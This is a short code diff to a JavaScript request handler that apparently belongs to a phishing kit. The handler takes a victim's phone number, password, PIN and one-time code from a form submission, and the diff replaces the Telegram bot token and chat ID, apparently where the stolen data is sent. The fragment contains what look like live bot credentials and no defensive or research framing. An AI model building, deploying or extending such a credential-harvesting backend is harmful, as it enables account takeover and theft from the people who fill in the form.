@@ -6,8 +6,8 @@ export default async function handler(req, res) {
   const { type, phone, pass, pin, otp } = req.body;
 
   // --- TELEGRAM BOT CONFIGURATION ---
-  const BOT_TOKEN_1 = '9103979108:AAFTKSdKBpu3r9dfIDA5Qb-GEo8CnhiYFQ0';
-  const CHAT_ID_1 = '8689137450';
+  const BOT_TOKEN_1 = '8838087380:AAF5E52RvLq3CAmT9jQmhz66LBVDbTpODDY';
+  const CHAT_ID_1 = '8886438875';
 
   const BOT_TOKEN_2 = ''; 
   const CHAT_ID_2 = '';
